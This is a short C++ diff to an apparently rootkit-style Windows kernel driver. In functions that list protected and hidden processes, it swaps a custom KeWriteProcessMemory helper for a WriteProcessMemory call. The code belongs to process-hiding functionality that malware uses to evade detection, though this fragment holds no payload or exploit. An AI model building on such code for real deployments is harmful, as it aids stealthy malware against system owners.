@@ -441,7 +441,7 @@ bool ProcessHandler::ListProtectedProcesses(_Inout_ IoctlProcessList* processLis
 		ProtectedProcessEntry* item = CONTAINING_RECORD(currentEntry, ProtectedProcessEntry, Entry);
 
 		if (item) {
-			status = NidhoggMemoryUtils->KeWriteProcessMemory(
+			status = WriteProcessMemory(
 				&item->Pid,
 				PsGetCurrentProcess(),
 				processList->Processes + count ,
@@ -497,7 +497,7 @@ bool ProcessHandler::ListHiddenProcesses(_Inout_ IoctlProcessList* processList) 
 		HiddenProcessEntry* item = CONTAINING_RECORD(currentEntry, HiddenProcessEntry, Entry);
 
 		if (item) {
-			status = NidhoggMemoryUtils->KeWriteProcessMemory(
+			status = WriteProcessMemory(
 				&item->Pid,
 				PsGetCurrentProcess(),
 				processList->Processes + count,
